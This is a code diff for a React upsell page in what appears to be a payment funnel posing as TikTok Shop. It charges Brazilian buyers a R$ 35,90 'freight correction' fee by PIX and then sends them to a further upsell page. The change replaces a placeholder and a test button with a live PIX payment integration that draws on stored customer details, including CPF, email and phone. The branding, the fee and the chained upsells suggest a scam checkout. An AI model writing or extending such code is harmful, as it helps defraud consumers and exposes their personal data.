@@ -1,12 +1,17 @@
 import { useState, useEffect, useRef } from "react";
 import { useNavigate } from "react-router-dom";
-import { X, Copy, Clock, Loader2, Check, AlertTriangle } from "lucide-react";
+import { X, Check, AlertTriangle } from "lucide-react";
 import { toast } from "sonner";
 import { Button } from "@/components/ui/button";
 import { Progress } from "@/components/ui/progress";
+import { PixPaymentModal } from "@/components/PixPaymentModal";
+import { useParadisePix } from "@/hooks/useParadisePix";
 import tiktokLogo from "@/assets/upsell/tiktok-shop.png";
 import slimhealthLogo from "@/assets/slimhealth-logo.png";
 import cimedLogo from "@/assets/cimed-logo.png";
+
+const UPSELL_AMOUNT = 35.90;
+const UPSELL_DESCRIPTION = "Correção de Frete";
 
 const Upsell3Page = () => {
   const navigate = useNavigate();
@@ -26,10 +31,32 @@ const Upsell3Page = () => {
   
   // Modal state
   const [showModal, setShowModal] = useState(false);
-  const [timeLeft, setTimeLeft] = useState(900);
+  const [dadosPessoais, setDadosPessoais] = useState<{
+    nome: string;
+    email: string;
+    cpf: string;
+    telefone: string;
+  } | null>(null);
 
-  // PIX code placeholder
-  const pixCode = "00020101021226940014br.gov.bcb.pix2572qrcodespix.sejaefi.com.br/v2/cobfc73d8f1cc9a469c7b33e0e5d0e08a675204000053039865802BR5925TIKTOK SHOP FRETE6009SAO PAULO62070503***6304";
+  const {
+    isLoading,
+    error,
+    qrCode,
+    qrCodeBase64,
+    paymentStatus,
+    createPixPayment,
+    startPolling,
+    stopPolling,
+    reset,
+  } = useParadisePix();
+
+  // Load customer data
+  useEffect(() => {
+    const dadosSalvos = localStorage.getItem('dadosPessoais');
+    if (dadosSalvos) {
+      setDadosPessoais(JSON.parse(dadosSalvos));
+    }
+  }, []);
 
   // Verification phase animation
   useEffect(() => {
@@ -92,47 +119,45 @@ const Upsell3Page = () => {
     };
   }, [phase]);
 
-  // Modal timer
-  useEffect(() => {
-    if (!showModal) return;
+  const handleOpenModal = async () => {
+    setShowModal(true);
     
-    const timer = setInterval(() => {
-      setTimeLeft(prev => {
-        if (prev <= 1) {
-          clearInterval(timer);
-          return 0;
-        }
-        return prev - 1;
+    if (!dadosPessoais) {
+      toast.error("Dados do cliente não encontrados");
+      return;
+    }
+
+    const customer = {
+      name: dadosPessoais.nome,
+      email: dadosPessoais.email,
+      document: dadosPessoais.cpf,
+      phone: dadosPessoais.telefone,
+    };
+
+    const success = await createPixPayment(
+      UPSELL_AMOUNT,
+      UPSELL_DESCRIPTION,
+      customer,
+      `upsell3_${Date.now()}`
+    );
+
+    if (success) {
+      startPolling(() => {
+        toast.success("Pagamento confirmado!");
+        setShowModal(false);
+        navigate('/upsell4');
       });
-    }, 1000);
-    return () => clearInterval(timer);
-  }, [showModal]);
-
-  const formatTime = (seconds: number) => {
-    const mins = Math.floor(seconds / 60);
-    const secs = seconds % 60;
-    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
-  };
-
-  const handleCopyPix = async () => {
-    try {
-      await navigator.clipboard.writeText(pixCode);
-      toast.success("Código PIX copiado!");
-    } catch {
-      toast.error("Erro ao copiar código");
     }
   };
 
-  const handleOpenModal = () => {
-    setTimeLeft(900);
-    setShowModal(true);
+  const handleCloseModal = () => {
+    stopPolling();
+    setShowModal(false);
   };
 
-  const handleSimulatePayment = () => {
-    toast.success("Pagamento confirmado!");
-    setShowModal(false);
-    // Navigate to Upsell 4
-    navigate("/upsell4");
+  const handleRetry = () => {
+    reset();
+    handleOpenModal();
   };
 
   return (
@@ -272,90 +297,19 @@ const Upsell3Page = () => {
         </div>
       )}
 
-      {/* Payment Modal */}
-      {showModal && (
-        <div 
-          className="fixed inset-0 z-50 bg-black/60 flex items-center justify-center p-4"
-          onClick={() => setShowModal(false)}
-        >
-          <div 
-            className="bg-white w-full max-w-sm rounded-2xl overflow-hidden shadow-2xl"
-            onClick={(e) => e.stopPropagation()}
-          >
-            {/* Modal Header */}
-            <div className="bg-white px-4 py-3 flex items-center justify-between">
-              <div className="w-8" />
-              <img src={tiktokLogo} alt="TikTok Shop" className="h-8 w-auto" />
-              <button 
-                onClick={() => setShowModal(false)}
-                className="w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors"
-              >
-                <X className="w-5 h-5 text-gray-500" />
-              </button>
-            </div>
-
-            {/* Modal Content */}
-            <div className="p-6">
-              {/* Title and Value */}
-              <div className="text-center mb-4">
-                <p className="text-gray-500 text-sm font-medium">Correção de Frete</p>
-                <p className="text-3xl font-bold text-gray-900 mt-1">R$ 35,90</p>
-              </div>
-
-              {/* QR Code */}
-              <div className="flex justify-center mb-4">
-                <div className="w-48 h-48 bg-gray-100 border-2 border-gray-200 rounded-lg flex items-center justify-center">
-                  <div className="w-36 h-36 bg-gray-200 rounded grid grid-cols-6 grid-rows-6 gap-0.5 p-2">
-                    {Array.from({ length: 36 }).map((_, i) => (
-                      <div 
-                        key={i} 
-                        className={`rounded-sm ${Math.random() > 0.4 ? 'bg-gray-800' : 'bg-white'}`}
-                      />
-                    ))}
-                  </div>
-                </div>
-              </div>
-
-              {/* Copy Button */}
-              <Button
-                onClick={handleCopyPix}
-                className="w-full bg-rose-500 hover:bg-rose-600 text-white font-semibold py-3 rounded-xl flex items-center justify-center gap-2"
-              >
-                <Copy className="w-5 h-5" />
-                Copiar código PIX
-              </Button>
-
-              {/* Timer */}
-              <div className="flex items-center justify-center gap-2 mt-4 text-amber-600">
-                <Clock className="w-4 h-4" />
-                <span className="text-sm font-medium">
-                  O PIX expira em: <span className="font-bold">{formatTime(timeLeft)}</span>
-                </span>
-              </div>
-
-              {/* Waiting confirmation */}
-              <div className="flex items-center justify-center gap-2 mt-2 text-amber-600">
-                <Loader2 className="w-4 h-4 animate-spin" />
-                <span className="text-sm">Aguardando confirmação...</span>
-              </div>
-
-              {/* PIX code truncated */}
-              <p className="text-xs text-gray-400 text-center mt-4 break-all line-clamp-2 px-2">
-                {pixCode}
-              </p>
-
-              {/* Simulate payment button (for testing) */}
-              <Button
-                onClick={handleSimulatePayment}
-                variant="outline"
-                className="w-full mt-4 border-gray-300 text-gray-600 font-medium py-2 rounded-xl"
-              >
-                Simular Pagamento (Teste)
-              </Button>
-            </div>
-          </div>
-        </div>
-      )}
+      {/* Modal de Pagamento PIX */}
+      <PixPaymentModal
+        isOpen={showModal}
+        onClose={handleCloseModal}
+        title="Correção de Frete"
+        amount={UPSELL_AMOUNT}
+        qrCode={qrCode}
+        qrCodeBase64={qrCodeBase64}
+        isLoading={isLoading}
+        paymentStatus={paymentStatus}
+        error={error}
+        onRetry={handleRetry}
+      />
     </div>
   );
 };
